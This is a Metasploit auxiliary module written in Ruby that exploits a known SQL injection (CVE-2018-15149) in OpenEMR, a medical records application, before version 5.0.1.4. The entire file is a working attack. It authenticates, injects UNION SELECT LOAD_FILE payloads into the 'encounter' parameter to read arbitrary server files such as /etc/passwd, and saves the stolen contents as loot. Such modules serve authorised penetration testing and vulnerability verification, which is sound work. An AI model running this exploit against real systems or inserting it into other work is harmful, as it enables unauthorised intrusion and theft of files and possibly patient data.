class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenEMR prior to 5.0.1.4 SQL Injection in encounter parameter',
        'Description' => %q{
          This module exploits an SQL injection vulnerability in OpenEMR prior to
          version 5.0.1.4. The vulnerability exists in interface/forms/eye_mag/php/Anything_simple.php
          where the encounter parameter is passed unsanitized to getProviderIdOfEncounter()
          in library/forms.inc. This allows an authenticated attacker to read arbitrary
          files from the server using MySQL LOAD_FILE() function.
        },
        'Author' => [
          'AMENDER',
          'Rezwanul Haque'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2018-15149']
        ],
        'DisclosureDate' => 'Aug 13, 2018',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
        OptString.new('PASSWORD', [false, 'Password for authentication', '']),
        OptString.new('SITE', [true, 'OpenEMR site name', 'default']),
        OptString.new('TARGETFILE', [true, 'File to read from target system', '/etc/passwd'])
      ]
    )
  end

  def target_uri
    normalize_uri(datastore['TARGETURI'])
  end

  def authenticate
    print_status('Authenticating to OpenEMR...')

    auth_uri = normalize_uri(target_uri, 'interface', 'main', 'main_screen.php')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => auth_uri,
      'vars_get' => {
        'auth' => 'login',
        'site' => datastore['SITE']
      },
      'vars_post' => {
        'new_login_session_management' => '1',
        'authProvider' => 'Default',
        'authUser' => datastore['USERNAME'],
        'clearPass' => datastore['PASSWORD'],
        'languageChoice' => '1'
      }
    )

    unless res
      print_error('[-] No response received during authentication')
      return nil
    end

    if res.code == 302 || res.code == 200
      cookie = res.get_cookies
      if cookie && !cookie.empty?
        if res.body && (res.body.include?('Invalid') || res.body.include?('denied') || res.body.include?('error'))
          print_error('[-] Authentication failed - invalid credentials')
          return nil
        end
        print_good('[+] Authentication successful')
        return cookie
      end
    end

    if res.body && res.body.include?('login')
      print_error('[-] Authentication failed - login page returned')
      return nil
    end

    cookie = res.get_cookies
    if cookie && !cookie.empty?
      print_good('[+] Authentication successful')
      return cookie
    end

    print_error('[-] Authentication failed - no session cookie received')
    nil
  end

  def exploit_sqli(cookie)
    print_status("Attempting to read file: #{datastore['TARGETFILE']}")

    vuln_uri = normalize_uri(target_uri, 'interface', 'forms', 'eye_mag', 'php', 'Anything_simple.php')

    file_path = datastore['TARGETFILE']
    sqli_payload = "1 UNION SELECT 1,2,3,4,LOAD_FILE('#{file_path}'),6,7,8,9,10-- -"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => vuln_uri,
      'cookie' => cookie,
      'vars_get' => {
        'encounter' => sqli_payload
      }
    )

    unless res
      print_error('[-] No response received from vulnerable endpoint')
      return nil
    end

    if res.body && res.body.include?('root:x:0:0')
      return res.body
    end

    sqli_payload_alt = "1' UNION SELECT 1,2,3,4,LOAD_FILE('#{file_path}'),6,7,8,9,10-- -"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => vuln_uri,
      'cookie' => cookie,
      'vars_get' => {
        'encounter' => sqli_payload_alt
      }
    )

    unless res
      print_error('[-] No response received from vulnerable endpoint')
      return nil
    end

    if res.body && res.body.include?('root:x:0:0')
      return res.body
    end

    sqli_payload_simple = "-1 UNION SELECT LOAD_FILE('#{file_path}')-- -"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => vuln_uri,
      'cookie' => cookie,
      'vars_get' => {
        'encounter' => sqli_payload_simple
      }
    )

    unless res
      print_error('[-] No response received from vulnerable endpoint')
      return nil
    end

    res.body
  end

  def extract_file_content(response_body)
    return nil unless response_body

    if response_body.include?('root:x:0:0')
      lines = response_body.split("\n")
      file_content = []
      capturing = false

      lines.each do |line|
        if line.include?('root:x:0:0')
          capturing = true
        end

        if capturing
          if line =~ /^[a-zA-Z0-9_-]+:x:\d+:\d+/
            file_content << line.strip
          elsif line.include?(':') && line =~ /^\S+:\S*:\d*:\d*/
            file_content << line.strip
          else
            break if file_content.length > 0 && line.strip.empty?
          end
        end
      end

      return file_content.join("\n") unless file_content.empty?

      match = response_body.match(/(root:x:0:0.*?)(?:<|$)/m)
      return match[1].strip if match
    end

    response_body
  end

  def run
    cookie = authenticate
    return unless cookie

    response = exploit_sqli(cookie)

    unless response
      print_error('[-] Exploit failed - no response from target')
      return
    end

    if response.include?('login') || response.include?('Login')
      print_error('[-] Session expired or access denied')
      return
    end

    if response.include?('Invalid') || response.include?('denied') || response.include?('error')
      print_error('[-] SQL injection failed - access denied or invalid query')
      return
    end

    if response.include?('root:x:0:0')
      file_content = extract_file_content(response)
      print_good('[+] File content:')
      print_line(file_content)

      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references,
        info: "SQL Injection in encounter parameter - successfully read #{datastore['TARGETFILE']}"
      )

      loot = store_loot(
        'openemr.file',
        'text/plain',
        rhost,
        file_content,
        datastore['TARGETFILE'],
        'File retrieved via SQL injection'
      )
      print_good("[+] File saved to: #{loot}")
    else
      print_warning('[*] Response received but file content not detected')
      print_warning('[*] The target may not be vulnerable or MySQL FILE privilege may be restricted')
      vprint_status("Response body: #{response[0..500]}...")
    end
  end
end